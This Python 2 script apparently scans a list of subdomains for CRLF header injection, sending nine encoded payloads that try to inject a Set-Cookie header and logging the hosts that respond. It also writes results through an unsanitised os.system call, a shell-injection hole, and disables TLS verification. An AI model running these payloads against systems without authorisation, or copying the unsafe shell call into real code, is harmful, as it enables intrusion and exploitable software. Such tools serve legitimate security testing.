#!/usr/bin/python

# Modules
import argparse
import requests
import sys,os

# Modules
from colorama import Style,Fore

# should create Set-Cookie:mycookie=myvalue header if vulnerable
PAYLOADS = [r"%0D%0ASet-Cookie:mycookie=myvalue",

            r"%0d%0aSet-Cookie:mycookie=myvalue",

            r"crlf%0dSet-Cookie:mycookie=myvalue",

            r"crlf%0aSet-Cookie:mycookie=myvalue",

            r"%23%0dSet-Cookie:mycookie=myvalue",

            r"%0dSet-Cookie:mycookie=myvalue",

            r"%0ASet-Cookie:mycookie=myvalue?foo",

            r"%0aSet-Cookie:mycookie=myvalue",

            r"/xxx%0ASet-Cookie:mycookie=myvalue;"]

"""
Print the Ascii Banner
"""
def ascii():

        print Style.BRIGHT + Fore.WHITE + """

  ____  __ __  ______   ___          __  ____   _      _____
 /    ||  |  ||      | /   \        /  ]|    \ | |    |     |
|  o  ||  |  ||      ||     |      /  / |  D  )| |    |   __|
|     ||  |  ||_|  |_||  O  |     /  /  |    / | |___ |  |_
|  _  ||  :  |  |  |  |     |    /   \_ |    \ |     ||   _]
|  |  ||     |  |  |  |     |    \     ||  .  \|     ||  |
|__|__| \__,_|  |__|   \___/      \____||__|\_||_____||__|

        """ + Style.DIM + Fore.RED + """                @z0idex

        """

ascii()



"""
Test for CRLF Injection
"""
# Protocol either 'http://' or 'https://'
def crlf(subdomain):

    for payload in PAYLOADS:

        try:
            r = requests.get("%s/%s" % (subdomain, payload), verify=False, timeout=.5, allow_redirects=False)

            for name in r.cookies.keys():

                if "mycookie" in name:

                    print Style.BRIGHT + Fore.WHITE+"["+Fore.GREEN+"+"+Fore.WHITE+"]"+" VULNERABLE: %s/%s" % (subdomain, payload)
	            os.system("echo %s/%s >> crlf-results.txt" % (subdomain, payload))	    

        except Exception as e:
            print Fore.RED+"ERROR STRING: %s/%s" % (subdomain, payload)



"""
Read the file and execute the CRLF func()
"""
def run(file):
	with open(file, "r") as f:
		for subdomain in f:
			subdomain = subdomain.split()[0]
			print Style.BRIGHT+Fore.WHITE+"["+Fore.CYAN+"+"+Fore.WHITE+"] Scanning: %s " % subdomain
			crlf(subdomain)




# Arguments
print Style.RESET_ALL + Fore.BLUE
parser = argparse.ArgumentParser(description="Finds CRLF vulnerabilities")
parser.add_argument("-f", "--file", required=True)
args = parser.parse_args()

if (os.path.isfile(args.file)):
        run(args.file)
else:
        print Style.BRIGHT + Fore.WHITE+"["+Fore.RED+"!"+Fore.WHITE+"] No Such file"
